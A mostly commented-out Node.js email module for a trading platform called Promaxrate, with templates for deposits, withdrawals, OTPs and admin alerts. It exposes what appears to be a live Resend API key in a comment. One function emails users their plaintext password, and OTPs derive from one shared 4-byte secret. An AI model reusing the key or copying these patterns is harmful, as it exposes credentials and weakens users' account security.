// const bcrypt = require("bcryptjs");
// const salt = bcrypt.genSaltSync(10);
// const axios = require("axios");
// var nodemailer = require("nodemailer");
// const speakeasy = require('speakeasy');

// const secret = speakeasy.generateSecret({ length: 4 });


// const hashPassword = (password) => {
//   const hashedPassword = bcrypt.hashSync(password, salt);
//   return hashedPassword;
// };

// const compareHashedPassword = (hashedPassword, password) => {
//   const isSame = bcrypt.compareSync(password, hashedPassword);
//   return isSame;
// };




// // const sendDepositEmail = async ({ from, amount, method,timestamp}) => {
// //   let transporter = nodemailer.createTransport({
// //     host: "mail.privateemail.com",
// //     port: 465,
// //     secure: true,
// //     auth: {
// //       user: process.env.EMAIL_USER, // generated ethereal user
// //       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
// //     },
// //   });

// //   let info = await transporter.sendMail({
// //     from: `${process.env.EMAIL_USER}`, // sender address
// //     to: "support@promaxrate.com ", // list of receivers
// //     subject: "Transaction Notification", // Subject line
// //     // text: "Hello ?", // plain text body
// //     html: `



// const sendWithdrawalRequestEmail = async ({  from, amount, method,address }) => {
  
//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: "support@promaxrate.com ", // list of receivers
//     subject: "Transaction Notification", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `

//     <html>
//     <head>
//       <style>
//         body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
//         .container { max-width: 600px; margin: 0 auto; padding: 20px; background: white; }
//         .header { background: #11409c; color: white; padding: 20px; text-align: center; }
//         .content { padding: 20px; }
//         .footer { text-align: center; padding: 20px; background: #f7f7f7; }
//         .highlight { color: #11409c; font-weight: bold; }
//       </style>
//     </head>
//     <body>
//       <div class="container">
//         <div class="header">
//           <h2>Withdrawal Request Notification</h2>
//         </div>
//         <div class="content">
//           <p>Hello Chief,</p>
//           <p>A new withdrawal request has been received with the following details:</p>
//           <p>Client: <span class="highlight">${from}</span></p>
//           <p>Amount: <span class="highlight">$${amount}</span></p>
//           <p>Currency: <span class="highlight">${method}</span></p>
//           <p>Wallet Address: <span class="highlight">${address}</span></p>
//           <p>Please review and process this request at your earliest convenience.</p>
//         </div>
//         <div class="footer">
//           <p>Best regards,</p>
//           <p><strong>Promaxrate Team</strong></p>
//         </div>
//       </div>
//     </body>
//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };

// const userRegisteration = async ({  firstName,email}) => {
  
//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: "support@promaxrate.com ", // list of receivers
//     subject: "Transaction Notification", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `

//     <html>
//     <head>
//       <style>
//         body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
//         .container { max-width: 600px; margin: 0 auto; padding: 20px; background: white; }
//         .header { background: #11409c; color: white; padding: 20px; text-align: center; }
//         .content { padding: 20px; }
//         .footer { text-align: center; padding: 20px; background: #f7f7f7; }
//         .highlight { color: #11409c; font-weight: bold; }
//       </style>
//     </head>
//     <body>
//       <div class="container">
//         <div class="header">
//           <h2>New User Registration</h2>
//         </div>
//         <div class="content">
//           <p>Hello Chief,</p>
//           <p>A new user has just registered on the platform:</p>
//           <p>Name: <span class="highlight">${firstName}</span></p>
//           <p>Email: <span class="highlight">${email}</span></p>
//           <p>Please visit your dashboard to review and confirm this registration.</p>
//         </div>
//         <div class="footer">
//           <p>Best regards,</p>
//           <p><strong>Promaxrate Team</strong></p>
//         </div>
//       </div>
//     </body>
//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };


// const sendWithdrawalEmail = async ({  to, address, amount, method, timestamp, from }) => {
//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER,
//       pass: process.env.EMAIL_PASSWORD,
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `"Promaxrate" <${process.env.EMAIL_USER}>`,
//     to: to,
//     subject: "💸 Withdrawal Request Confirmation",
//     html: `
//     <html>
//       <body style="margin:0; padding:0; background-color:#f4f9f4; font-family:Arial, sans-serif; color:#333;">
//         <table align="center" width="100%" cellpadding="0" cellspacing="0" style="max-width:600px; background:#ffffff; border-radius:10px; overflow:hidden; box-shadow:0 4px 12px rgba(0,0,0,0.1);">
//           <!-- Header -->
//           <tr style="background-color:#11409c;">
//             <td align="center" style="padding:20px;">
//               <img src="cid:logo" alt="Promaxrate Logo" width="80" style="display:block; margin-bottom:10px;">
//               <h1 style="color:#ffffff; font-size:22px; margin:0;">Withdrawal Request Confirmation</h1>
//             </td>
//           </tr>

//           <!-- Body -->
//           <tr>
//             <td style="padding:30px;">
//               <p style="font-size:16px; line-height:1.5; color:#444;">
//                 Dear ${from},
//               </p>
//               <p style="font-size:16px; line-height:1.5; color:#444;">
//                 Your withdrawal request has been successfully submitted. Here are the details:
//               </p>

//               <table width="100%" style="background-color:#f7f7f7; border-radius:8px; margin:25px 0; border-left:4px solid #11409c;">
//                 <tr>
//                   <td style="padding:20px;">
//                     <table width="100%" cellpadding="8" cellspacing="0">
//                       <tr>
//                         <td style="color:#666;">Amount:</td>
//                         <td style="color:#11409c; font-weight:bold;">$${amount}</td>
//                       </tr>
//                       <tr>
//                         <td style="color:#666;">Wallet Address:</td>
//                         <td style="color:#11409c; font-weight:bold;">${address}</td>
//                       </tr>
//                       <tr>
//                         <td style="color:#666;">Payment Method:</td>
//                         <td style="color:#11409c; font-weight:bold;">${method}</td>
//                       </tr>
//                     </table>
//                   </td>
//                 </tr>
//               </table>

//               <p style="font-size:16px; line-height:1.5; color:#444;">
//                 Our team will process your request as soon as possible. You will receive another email once the withdrawal is approved.
//               </p>

//               <div style="text-align:center; margin-top:25px;">
//                 <a href="https://Promaxrate.com/dashboard/transactions" 
//                    style="background-color:#11409c; color:#ffffff; text-decoration:none; padding:12px 24px; border-radius:6px; font-size:16px; display:inline-block; font-weight:bold;">
//                    📊 View Transaction History
//                 </a>
//               </div>
//             </td>
//           </tr>

//           <!-- Footer -->
//           <tr style="background-color:#f7f7f7;">
//             <td style="text-align:center; padding:20px; font-size:13px; color:#666;">
//               <p style="margin:0;">© ${new Date().getFullYear()} Promaxrate | All Rights Reserved</p>
//             </td>
//           </tr>
//         </table>
//       </body>
//     </html>
//     `,
//     attachments: [
//       {
//         filename: "logo.png",
//         path: "./logo.png",
//         cid: "logo",
//       },
//     ],
//   });

//   console.log("Message sent: %s", info.messageId);
// };


// const sendDepositEmail = async ({  from, amount, method, timestamp }) => {
//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER,
//       pass: process.env.EMAIL_PASSWORD,
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `"Promaxrate" <${process.env.EMAIL_USER}>`,
//     to: "support@promaxrate.com",
//     subject: "💰 New Deposit Notification",
//     html: `
//     <html>
//       <body style="margin:0; padding:0; background-color:#f4f9f4; font-family:Arial, sans-serif; color:#333;">
//         <table align="center" width="100%" cellpadding="0" cellspacing="0" style="max-width:600px; background:#ffffff; border-radius:10px; overflow:hidden; box-shadow:0 4px 12px rgba(0,0,0,0.1);">
//           <!-- Header -->
//           <tr style="background-color:#11409c;">
//             <td align="center" style="padding:20px;">
//               <img src="cid:logo" alt="Promaxrate Logo" width="80" style="display:block; margin-bottom:10px;">
//               <h1 style="color:#ffffff; font-size:22px; margin:0;">New Deposit Notification</h1>
//             </td>
//           </tr>

//           <!-- Body -->
//           <tr>
//             <td style="padding:30px;">
//               <p style="font-size:16px; line-height:1.5; color:#444;">
//                 Hello Chief,
//               </p>
//               <p style="font-size:16px; line-height:1.5; color:#444;">
//                 A new deposit has been initiated with the following details:
//               </p>

//               <table width="100%" style="background-color:#f7f7f7; border-radius:8px; margin:25px 0; border-left:4px solid #11409c;">
//                 <tr>
//                   <td style="padding:20px;">
//                     <table width="100%" cellpadding="8" cellspacing="0">
//                       <tr>
//                         <td style="color:#666;">Client:</td>
//                         <td style="color:#11409c; font-weight:bold;">${from}</td>
//                       </tr>
//                       <tr>
//                         <td style="color:#666;">Amount:</td>
//                         <td style="color:#11409c; font-weight:bold;">$${amount}</td>
//                       </tr>
//                       <tr>
//                         <td style="color:#666;">Payment Method:</td>
//                         <td style="color:#11409c; font-weight:bold;">${method}</td>
//                       </tr>
//                       <tr>
//                         <td style="color:#666;">Timestamp:</td>
//                         <td style="color:#11409c; font-weight:bold;">${timestamp}</td>
//                       </tr>
//                     </table>
//                   </td>
//                 </tr>
//               </table>

//               <p style="font-size:16px; line-height:1.5; color:#444;">
//                 Please verify this transaction and update the user's balance in the admin dashboard.
//               </p>

//               <div style="text-align:center; margin-top:25px;">
//                 <a href="https://Promaxrate.com/admin/dashboard" 
//                    style="background-color:#11409c; color:#ffffff; text-decoration:none; padding:12px 24px; border-radius:6px; font-size:16px; display:inline-block; font-weight:bold;">
//                    🔍 Review Transaction
//                 </a>
//               </div>
//             </td>
//           </tr>

//           <!-- Footer -->
//           <tr style="background-color:#f7f7f7;">
//             <td style="text-align:center; padding:20px; font-size:13px; color:#666;">
//               <p style="margin:0;">© ${new Date().getFullYear()} Promaxrate | All Rights Reserved</p>
//             </td>
//           </tr>
//         </table>
//       </body>
//     </html>
//     `,
//     attachments: [
//       {
//         filename: "logo.png",
//         path: "./logo.png",
//         cid: "logo",
//       },
//     ],
//   });

//   console.log("Message sent: %s", info.messageId);
// };

// const sendBankDepositRequestEmail = async ({  from, amount, method,timestamp }) => {
  
//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: "support@promaxrate.com ", // list of receivers
//     subject: "Transaction Notification", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `

//     <html>
//     <head>
//       <style>
//         body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
//         .container { max-width: 600px; margin: 0 auto; padding: 20px; background: white; }
//         .header { background: #11409c; color: white; padding: 20px; text-align: center; }
//         .content { padding: 20px; }
//         .footer { text-align: center; padding: 20px; background: #f7f7f7; }
//         .highlight { color: #11409c; font-weight: bold; }
//         .request-details { background: #f7f7f7; padding: 15px; margin: 15px 0; border-left: 4px solid #11409c; }
//       </style>
//     </head>
//     <body>
//       <div class="container">
//         <div class="header">
//           <h2>Bank Transfer Request</h2>
//         </div>
//         <div class="content">
//           <p>Hello Chief,</p>
//           <p>A new bank transfer request has been received:</p>
//           <div class="request-details">
//             <p>Client: <span class="highlight">${from}</span></p>
//             <p>Amount: <span class="highlight">$${amount}</span></p>
//             <p>Timestamp: <span class="highlight">${timestamp}</span></p>
//           </div>
//           <p>Please provide the necessary bank account details to process this request.</p>
//         </div>
//         <div class="footer">
//           <p>Best regards,</p>
//           <p><strong>Promaxrate Team</strong></p>
//         </div>
//       </div>
//     </body>
//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };

// const sendDepositApproval = async ({  from, amount, method,timestamp,to}) => {
  
//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: to, // list of receivers
//     subject: "Transaction Notification", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `

//     <html>
//     <head>
//       <style>
//         body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
//         .container { max-width: 600px; margin: 0 auto; padding: 20px; background: white; }
//         .header { background: #11409c; color: white; padding: 20px; text-align: center; }
//         .content { padding: 20px; }
//         .footer { text-align: center; padding: 20px; background: #f7f7f7; }
//         .highlight { color: #11409c; font-weight: bold; }
//         .approval-details { background: #f7f7f7; padding: 15px; margin: 15px 0; border-left: 4px solid #11409c; }
//         .cta-button { display: inline-block; background: #11409c; color: white; padding: 10px 20px; text-decoration: none; border-radius: 5px; margin-top: 15px; }
//       </style>
//     </head>
//     <body>
//       <div class="container">
//         <div class="header">
//           <h2>Deposit Approval Confirmation</h2>
//         </div>
//         <div class="content">
//           <p>Dear ${from},</p>
//           <p>Great news! Your deposit has been successfully approved:</p>
//           <div class="approval-details">
//             <p>Amount: <span class="highlight">${amount}</span></p>
//             <p>Payment Method: <span class="highlight">${method}</span></p>
//             <p>Timestamp: <span class="highlight">${timestamp}</span></p>
//           </div>
//           <p>Your account has been credited with the deposited amount.</p>
//           <a href="/dashboard" class="cta-button">View Dashboard</a>
//         </div>
//         <div class="footer">
//           <p>Best regards,</p>
//           <p><strong>Promaxrate Team</strong></p>
//         </div>
//       </div>
//     </body>
//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };

// const sendPlanEmail = async ({  from, subamount, subname,timestamp }) => {
  
//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: "support@promaxrate.com ", // list of receivers
//     subject: "Transaction Notification", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `

//     <html>
//     <head>
//       <style>
//         body { font-family: Arial, sans-serif; line-height: 1.6; color: #333; }
//         .container { max-width: 600px; margin: 0 auto; padding: 20px; background: white; }
//         .header { background: #11409c; color: white; padding: 20px; text-align: center; }
//         .content { padding: 20px; }
//         .footer { text-align: center; padding: 20px; background: #f7f7f7; }
//         .highlight { color: #11409c; font-weight: bold; }
//         .plan-details { background: #f7f7f7; padding: 15px; margin: 15px 0; border-left: 4px solid #11409c; }
//       </style>
//     </head>
//     <body>
//       <div class="container">
//         <div class="header">
//           <h2>New Plan Subscription</h2>
//         </div>
//         <div class="content">
//           <p>Hello Chief,</p>
//           <p>A new plan subscription has been initiated:</p>
//           <div class="plan-details">
//             <p>Client: <span class="highlight">${from}</span></p>
//             <p>Plan Name: <span class="highlight">${subname}</span></p>
//             <p>Amount: <span class="highlight">$${subamount}</span></p>
//             <p>Timestamp: <span class="highlight">${timestamp}</span></p>
//           </div>
//           <p>Please review and process this subscription request.</p>
//         </div>
//         <div class="footer">
//           <p>Best regards,</p>
//           <p><strong>Promaxrate Team</strong></p>
//         </div>
//       </div>
//     </body>
//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };



// const sendForgotPasswordEmail = async (email) => {
//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: `${email}`, // list of receivers
//     subject: "Password Reset", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `
//     <html>
//     <p>Dear esteemed user,</p>

//     <p>Forgot your password?</p>
//     <p>We received a request to reset the password for your account</p>

//     <p>To reset your password, click on the link below
//     <a href="https://Bevfx.com/reset-password">
//     reset password
//     </p>


//     <p>If you did not make this request, please ignore this email</p>

//     <p>Best wishes,</p>
//     <p>Bevfx Team</p>
//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };

// const sendVerificationEmail = async ({ from, url }) => {
//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: "support@promaxrate.com ", // list of receivers
//     subject: "Account Verification Notification", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `
//     <html>
//     <p>Hello Chief</p>

//     <p>${from} just verified his Bevfx Team Identity
//     </p>

//     <p>Click <a href="${url}">here</a> to view the document</p>


//     <p>Best wishes,</p>
//     <p>Promaxrate Team</p>

//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };

// const sendWelcomeEmail = async ({ to, otp }) => {
//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER,
//       pass: process.env.EMAIL_PASSWORD,
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `"Promaxrate" <${process.env.EMAIL_USER}>`,
//     to: to,
//     subject: "🎉 Welcome to Promaxrate!",
//     html: `
//     <html>
//       <body style="margin:0; padding:0; background-color:#f4f9f4; font-family:Arial, sans-serif; color:#333;">
//         <table align="center" width="100%" cellpadding="0" cellspacing="0" style="max-width:600px; background:#ffffff; border-radius:10px; overflow:hidden; box-shadow:0 4px 12px rgba(0,0,0,0.1);">
//           <!-- Header -->
//           <tr style="background-color:#11409c;">
//             <td align="center" style="padding:20px;">
//               <img src="cid:logo" alt="Promaxrate Logo" width="80" style="display:block; margin-bottom:10px;">
//               <h1 style="color:#ffffff; font-size:22px; margin:0;">Welcome to Promaxrate</h1>
//             </td>
//           </tr>

//           <!-- Body -->
//           <tr>
//             <td style="padding:30px;">
//               <p style="font-size:16px; line-height:1.5; color:#444;">
//                 Hi there 👋,
//               </p>
//               <p style="font-size:16px; line-height:1.5; color:#444;">
//                 We're excited to have you join <b>Promaxrate</b> 🌟. 
//                 Our platform is designed to help you achieve your financial goals through smart trading strategies.🚀
//               </p>

//               <div style="background-color:#f7f7f7; border-radius:8px; padding:20px; margin:25px 0; border-left:4px solid #11409c;">
//                 <p style="font-size:16px; margin:0 0 10px 0;">Your Verification Code:</p>
//                 <p style="font-size:24px; color:#11409c; font-weight:bold; margin:0; letter-spacing:2px;">${otp}</p>
//                 <p style="font-size:14px; color:#666; margin:10px 0 0 0;">This code will expire in 5 minutes</p>
//               </div>

//               <p style="font-size:16px; line-height:1.5; color:#444;">
//                 Once verified, you'll have full access to your dashboard where you can start your trading journey.
//               </p>

             
//               <p style="font-size:14px; color:#555; margin-top:30px;">
//                 If you have any questions, our support team is here to help 24/7.
//               </p>
//             </td>
//           </tr>

//           <!-- Footer -->
//           <tr style="background-color:#f7f7f7;">
//             <td style="text-align:center; padding:20px; font-size:13px; color:#666;">
//               <p style="margin:0;">© ${new Date().getFullYear()} Promaxrate | All Rights Reserved</p>
//             </td>
//           </tr>
//         </table>
//       </body>
//     </html>
//     `,
//     attachments: [
//       {
//         filename: "logo.png",
//         path: "./logo.png",
//         cid: "logo",
//       },
//     ],
//   });

//   console.log("Message sent: %s", info.messageId);
// };






// const resendWelcomeEmail = async ({ to, token }) => {
//   async function reverifyEmail() {
  

//     const response = axios.put(
//       `https://toptradexp.com/toptradexp.com/verified.html`
//     );

//     console.log("=============VERIFY EMAIL=======================");
//     console.log(response);
//     console.log("====================================");
//   }

//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: to, // list of receivers
//     subject: "Account Verification", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `
//     <html>
//     <h2>Welcome to Promaxrate</h2>

//     <p>Let us know if this is really your email address, 
//     to help us keep your account secure
//     </p>


//     <p>Confirm your email and let's get started!</p>

//     <p>Your OTP is: ${speakeasy.totp({ secret: secret.base32, encoding: 'base32' })}</p>
//     <p>Best wishes,</p>
//     <p>Promaxrate Team</p>

//     </html>
    
//     `, // html body
//   });
// //'<a href="https://Bevfx.com/Bevfx.com/verified.html"  style="color:white; background:teal; padding: 10px 22px; width: fit-content; border-radius: 5px; border: 0; text-decoration: none; margin:2em 0">confirm email</a>'

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };

// const sendPasswordOtp = async ({ to }) => {
//   async function reverifyEmail() {
  

//     const response = axios.put(
//       `https://toptradexp.com/toptradexp.com/verified.html`
//     );

//     console.log("=============VERIFY EMAIL=======================");
//     console.log(response);
//     console.log("====================================");
//   }

//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: to, // list of receivers
//     subject: "Password Reset", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `
//     <html>
//     <h2>Welcome to Promaxrate</h2>

//     <p>Your OTP is: ${speakeasy.totp({ secret: secret.base32, encoding: 'base32' })}</p>
//     <p>This OTP is valid for a short period of time. Do not share it with anyone.</p>
//     <p>If you did not request this OTP, please ignore this email.</p>



//     <p>Best wishes,</p>
//     <p>Promaxrate Team</p>

//     </html>
    
//     `, // html body
//   });
// //'<a href="https://Bevfx.com/Bevfx.com/verified.html"  style="color:white; background:teal; padding: 10px 22px; width: fit-content; border-radius: 5px; border: 0; text-decoration: none; margin:2em 0">confirm email</a>'

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };



// const resetEmail = async ({ to, token }) => {
//   async function reverifyEmail() {
  

//     const response = axios.put(
//       `https://toptradexp.com.com/toptradexp.com/verified.html`
//     );


//     console.log("=============VERIFY EMAIL=======================");
//     console.log(response);
//     console.log("====================================");
//   }

//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: to, // list of receivers
//     subject: "Change Password", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `
//     <html>
//     <h2>Welcome to Promaxrate</h2>

//     <p>You have requested to change your password.Please use the following OTP to reset your password.
//     </p>


    
//     <p>Your OTP is: ${speakeasy.totp({ secret: secret.base32, encoding: 'base32' })}</p>


//     <p>If you did not request this password reset,please contact our support immediately.</p>

//     <p>Best wishes,</p>
//     <p>Promaxrate Team</p>

//     </html>
    
//     `, // html body
//   });
// //'<a href="https://Bevfx.com/Bevfx.com/verified.html"  style="color:white; background:teal; padding: 10px 22px; width: fit-content; border-radius: 5px; border: 0; text-decoration: none; margin:2em 0">confirm email</a>'

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };







// const sendUserPlanEmail = async ({  from, subamount, to,subname,timestamp }) => {
//   async function verifyEmail() {
  

//     const response = axios.put(
//       `https://toptradexp.com/toptradexp.com/verified.html`
//     );

//     console.log("=============VERIFY EMAIL=======================");
//     console.log(response);
//     console.log("====================================");
//   }

//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to:to, // list of receivers
//     subject: "Transaction Notification", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `

//     <html>
//     <p>Hello ${from},</p>

//     <p>You  successfully subscribed to $${subamount} worth of ${subname} plan at ${timestamp}</p>
//     <p>Best wishes,</p>
//     <p>Promaxrate Team</p>

//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };




// const sendUserDetails = async ({ to,password,firstName,token }) =>{
//   async function reverifyEmail() {
  

//     const response = axios.put(
//       `https://toptradexp.com.com/toptradexp.com/verified.html`
//     );


//     console.log("=============VERIFY EMAIL=======================");
//     console.log(response);
//     console.log("====================================");
//   }

//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: to, // list of receivers
//     subject: "User Details", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `
//     <html>
//     <h2>Hello ${firstName},</h2>

//     <p>Thank you for registering on our site
//     </p>

//     <p>Your login information:</p>
//    <p> Email: ${to}</p>
//    <p> Password: ${password}</p>


    
    

//     <p>If you did not authorize this registeration ,please contact our support immediately.</p>

//     <p>Best wishes,</p>
//     <p>Promaxrate Team</p>

//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

// }

// const sendUserDepositEmail = async ({  from, amount, to,method,timestamp }) => {
//   async function verifyEmail() {
  

//     const response = axios.put(
//       `https://toptradexp.com/toptradexp.com/verified.html`
//     );

//     console.log("=============VERIFY EMAIL=======================");
//     console.log(response);
//     console.log("====================================");
//   }

//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to:to, // list of receivers
//     subject: "Transaction Notification", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `

//     <html>
//     <p>Hello ${from}</p>

//     <p>You have sent a deposit order. Your deposit details are shown below for your reference</p>
//    <p>From: ${from} </p>
//    <p>Amount:$${amount}</p>
//     <p>Method: ${method}</p>
//     <p>Timestamp:${timestamp}</p>

//     <p>All payments are to be sent to your personal wallet address</p>

//     <p>Best wishes,</p>
//     <p>strategylivetrade Team</p>

//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
// };


// const sendKycAlert = async ({ firstName }) =>{
//   async function reverifyEmail() {
  

//     const response = axios.put(
//       `https://toptradexp.com.com/toptradexp.com/verified.html`
//     );


//     console.log("=============VERIFY EMAIL=======================");
//     console.log(response);
//     console.log("====================================");
//   }

//   let transporter = nodemailer.createTransport({
//     host: "mail.privateemail.com",
//     port: 465,
//     secure: true,
//     auth: {
//       user: process.env.EMAIL_USER, // generated ethereal user
//       pass: process.env.EMAIL_PASSWORD, // generated ethereal password
//     },
//   });

//   let info = await transporter.sendMail({
//     from: `${process.env.EMAIL_USER}`, // sender address
//     to: "support@promaxrate.com ", // list of receivers
//     subject: "User Details", // Subject line
//     // text: "Hello ?", // plain text body
//     html: `
//     <html>
//     <h2>Hello Chief,</h2>

//     <p>A user just submitted his/her KYC details.</p>
//     <p>Kindly check your dashboard to view details</p>

//     <p>Best wishes,</p>
//     <p>Promaxrate Team</p>

//     </html>
    
//     `, // html body
//   });

//   console.log("Message sent: %s", info.messageId);
//   // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>

// }





// module.exports = {
//   hashPassword,
//   userRegisteration,
//   compareHashedPassword,
//   sendDepositEmail,
//   sendPlanEmail,
//   sendUserPlanEmail,
//   sendDepositApproval,
//   sendPasswordOtp,
//   sendUserDepositEmail,
//   sendForgotPasswordEmail,
//   sendVerificationEmail,
//   sendBankDepositRequestEmail,
//   sendWithdrawalEmail,
//   sendWithdrawalRequestEmail,
//   sendWelcomeEmail,
//   resendWelcomeEmail,
//   resetEmail,
//   sendKycAlert,
//   sendUserDetails
// };
// utils/email.js
// Converted to use Resend API (https) instead of Nodemailer
//re_RHfmLLAJ_9djoLaAULN9Kqs8hLYjc3viz

//RESEND_API_KEY=re_RHfmLLAJ_9djoLaAULN9Kqs8hLYjc3viz
//FROM_EMAIL="Promaxrate <support@promaxrate.com>"
//RESEND_LOGO_URL=https://cdn.mycdn.com/assets/logo.png

// utils/email.js
